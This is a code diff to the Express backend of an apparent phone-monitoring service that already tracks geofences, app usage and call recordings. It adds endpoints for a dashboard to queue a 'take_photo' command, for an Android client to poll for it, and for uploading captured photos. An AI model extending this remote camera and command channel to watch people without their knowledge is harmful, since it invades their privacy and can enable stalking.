@@ -13,6 +13,10 @@ const Geofence = require('../models/Geofence');
 const AppUsage = require('../models/AppUsage');
 const CallRecording = require('../models/CallRecording');
 
+// NEW: Import the new models for photo and command
+const Photo = require('../models/Photo');
+const Command = require('../models/Command');
+
 // Helper: find device safely
 const findDevice = async (deviceId) => {
     if (!deviceId) return null;
@@ -272,6 +276,59 @@ router.post('/app-usage', async (req, res) => {
     } catch (err) {
         console.error('App Usage Error ❌:', err.message);
         res.status(500).json({ success: false, message: 'Server Error' });
+    }
+});
+
+// ================= PHOTO UPLOAD =================
+// NEW endpoint: receive photo from Android client
+router.post('/photo', async (req, res) => {
+    const { deviceId, imageBase64 } = req.body;
+    if (!imageBase64) {
+        return res.status(400).json({ success: false, message: 'Image required' });
+    }
+    const device = await findDevice(deviceId);
+    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
+    try {
+        await Photo.create({ deviceId: device._id, imageBase64 });
+        // Clear pending command
+        await Command.findOneAndUpdate({ deviceId: device._id }, { command: 'none' }, { upsert: true });
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Photo upload error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// ================= SET COMMAND (for dashboard) =================
+// NEW endpoint: dashboard sends a command (e.g., take_photo)
+router.post('/command', async (req, res) => {
+    const { deviceId, command } = req.body;
+    const device = await findDevice(deviceId);
+    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
+    try {
+        await Command.findOneAndUpdate(
+            { deviceId: device._id },
+            { command, createdAt: new Date() },
+            { upsert: true }
+        );
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Command set error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// ================= GET COMMAND (for Android client) =================
+// NEW endpoint: Android client polls to check if there's a pending command
+router.get('/command/:deviceId', async (req, res) => {
+    const device = await findDevice(req.params.deviceId);
+    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
+    const cmd = await Command.findOne({ deviceId: device._id });
+    const command = cmd ? cmd.command : 'none';
+    res.json({ success: true, command });
+    // Clear command after sending (except if it's 'none')
+    if (command === 'take_photo') {
+        await Command.updateOne({ deviceId: device._id }, { command: 'none' });
     }
 });
 
